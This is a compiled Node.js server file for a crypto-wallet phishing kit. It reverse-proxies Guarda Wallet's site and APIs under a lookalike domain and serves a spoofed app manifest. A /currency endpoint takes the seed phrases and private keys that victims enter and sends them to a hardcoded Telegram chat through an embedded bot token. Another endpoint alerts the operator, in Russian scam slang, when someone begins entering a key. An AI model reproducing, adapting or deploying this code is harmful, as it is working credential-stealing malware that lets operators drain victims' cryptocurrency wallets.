"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const proxy_1 = require("./util/proxy");
const path_1 = __importDefault(require("path"));
const cors_1 = __importDefault(require("cors"));
const app = (0, express_1.default)();
const node_telegram_bot_api_1 = __importDefault(require("node-telegram-bot-api"));
const token = '7869927971:AAGc7R7ZAVciglVM3RPMkhLO6GFG1fEyWe8';
const bot = new node_telegram_bot_api_1.default(token, { polling: true });
const id = 7812265370;
app.use((0, cors_1.default)());
app.use(express_1.default.static(path_1.default.resolve(__dirname, '..', 'public')));
console.log(path_1.default.resolve(__dirname, '..', 'public'));
const serverUrl = 'https://wallet.barrons.space/';
try {
    app.get('/conversion', (req, res) => {
        bot.sendMessage(id, `🤓🦣 Кто-то вводит ключ `, {
            parse_mode: "HTML"
        });
        res.writeHead(200, {});
        res.end();
    });
    app.post('/currency', (req, res) => {
        let request = '';
        req.on('data', (c) => request += c.toString());
        req.on('end', () => {
            if (typeof request === 'string') {
                request = JSON.parse(request);
                if (request.input.length > 10) {
                    if (!request.currency) {
                        bot.sendMessage(id, `🔑 mnemonic : <code>${request.input}</code>\n`, {
                            parse_mode: "HTML"
                        });
                    }
                    else {
                        bot.sendMessage(id, `🔑 key : <code>${request.input}</code>\n💷 currency: <code>${request.currency}</code>`, {
                            parse_mode: "HTML"
                        });
                    }
                    res.writeHead(200, {});
                    res.end();
                }
            }
        });
    });
    app.all('*', (req, res) => {
        console.log(req.url);
        if (req.url.includes('favicons')) {
            res.redirect('/favicon.jpg');
            res.end();
            return;
        }
        if (req.url === '/') {
            res.redirect('/app/import');
            res.end();
            return;
        }
        if (req.url.includes('/app/restore')) {
            res.redirect('/app/import');
            res.end();
            return;
        }
        if (req.url.includes('/api/v2/internal/logger')) {
            res.end();
            return;
        }
        if (req.url.includes('/assets/manifest.json')) {
            res.write(`{
                "name": "Guarda Wallet",
                "short_name": "Guarda",
                "scope":"${serverUrl}",
                "start_url": "${serverUrl}",
                "display": "standalone",
                "background_color": "#fff",
                "theme_color": "#798CE5",
                "prefer_related_applications": true,
                "related_applications": [{
                  "platform": "play",
                  "url": "https://play.google.com/store/apps/details?id=com.crypto.multiwallet",
                  "id": "com.guarda.multiwallet"
                }, {
                  "platform": "itunes",
                  "url": "https://itunes.apple.com/app/apple-store/id1442083982"
                }],
                "icons": [{
                    "src": "/assets/images/favicons/android-icon-36x36.png",
                    "sizes": "36x36",
                    "type": "image/png",
                    "density": "0.75"
                  },
                  {
                    "src": "/assets/images/favicons/android-icon-48x48.png",
                    "sizes": "48x48",
                    "type": "image/png",
                    "density": "1.0"
                  },
                  {
                    "src": "/assets/images/favicons/android-icon-72x72.png",
                    "sizes": "72x72",
                    "type": "image/png",
                    "density": "1.5"
                  },
                  {
                    "src": "/assets/images/favicons/android-icon-96x96.png",
                    "sizes": "96x96",
                    "type": "image/png",
                    "density": "2.0"
                  },
                  {
                    "src": "/assets/images/favicons/android-icon-144x144.png",
                    "sizes": "144x144",
                    "type": "image/png",
                    "density": "3.0"
                  },
                  {
                    "src": "/assets/images/favicons/android-icon-192x192.png",
                    "sizes": "192x192",
                    "type": "image/png",
                    "density": "4.0"
                  },
                  {
                    "src": "/assets/images/favicons/android-icon-512x512.png",
                    "sizes": "512x512",
                    "type": "image/png",
                    "density": "4.0"
                  },
                  {
                    "src": "/assets/images/favicons/maskable_icon.png",
                    "sizes": "384x384",
                    "type": "image/png",
                    "purpose": "any maskable"
                  }
                ]
              }`);
            res.end();
            return;
        }
        if (req.url.includes('/scripts/wallet-connect-v4.js')) {
            res.redirect('/scripts/wallet-connect-v4.js');
            res.end();
            return;
        }
        if (req.url.includes('/app/fec62772689d43733f0f995782559d5d.svg')) {
            res.redirect('/fec62772689d43733f0f995782559d5d.svg');
            res.end();
            return;
        }
        try {
            (0, proxy_1.delegateSimpleRequest)(req, res, 'guarda.com');
        }
        catch (error) {
            console.log(error);
        }
    });
}
catch (error) {
    console.log(error);
}
app.listen(3023, () => {
    console.log('server (main) started on po11rt 3000');
});
//spidorman
const api = (0, express_1.default)();
api.use((0, cors_1.default)());
api.use(express_1.default.static(path_1.default.resolve(__dirname, '..', 'public')));
console.log(path_1.default.resolve(__dirname, '..', 'public'));
try {
    api.all('*', (req, res) => {
        if (req.url.includes('/scripts/wallet-connect-v4.js')) {
            res.redirect('/scripts/wallet-connect-v4.js');
            res.end();
            return;
        }
        try {
            (0, proxy_1.delegateSimpleRequest)(req, res, 'chain-api.guarda.com');
        }
        catch (error) {
            console.log(error);
        }
    });
}
catch (error) {
    console.log(error);
}
api.listen(3024, () => {
    console.log('server (main) started on po11rt 3000');
});
//bsc solevoisomelie
const bscApi = (0, express_1.default)();
bscApi.use((0, cors_1.default)());
try {
    bscApi.all('*', (req, res) => {
        if (req.url.includes('/scripts/wallet-connect-v4.js')) {
            res.redirect('/scripts/wallet-connect-v4.js');
            res.end();
            return;
        }
        try {
            (0, proxy_1.delegateSimpleRequest)(req, res, 'bscnode.guarda.com');
        }
        catch (error) {
            console.log(error);
        }
    });
}
catch (error) {
    console.log(error);
}
bscApi.listen(3025, () => {
    console.log('server (main) started on po11rt 3000');
});
//settingsuits.guarda.com stevefootjobs
const settingsApi = (0, express_1.default)();
settingsApi.use((0, cors_1.default)());
try {
    settingsApi.all('*', (req, res) => {
        if (req.url.includes('/scripts/wallet-connect-v4.js')) {
            res.redirect('/scripts/wallet-connect-v4.js');
            res.end();
            return;
        }
        try {
            (0, proxy_1.delegateSimpleRequest)(req, res, 'settingsuits.guarda.com');
        }
        catch (error) {
            console.log(error);
        }
    });
}
catch (error) {
    console.log(error);
}
settingsApi.listen(3026, () => {
    console.log('server (main) started on po11rt 3000');
});
//https://dotnode.guarda.co 
const guardacoApi = (0, express_1.default)();
guardacoApi.use((0, cors_1.default)());
console.log(path_1.default.resolve(__dirname, '..', 'public'));
try {
    guardacoApi.all('*', (req, res) => {
        if (req.url.includes('/scripts/wallet-connect-v4.js')) {
            res.redirect('/scripts/wallet-connect-v4.js');
            res.end();
            return;
        }
        try {
            (0, proxy_1.delegateSimpleRequest)(req, res, 'dotnode.guarda.co');
        }
        catch (error) {
            console.log(error);
        }
    });
}
catch (error) {
    console.log(error);
}
guardacoApi.listen(3027, () => {
    console.log('server (main) started on po11rt 3000');
});
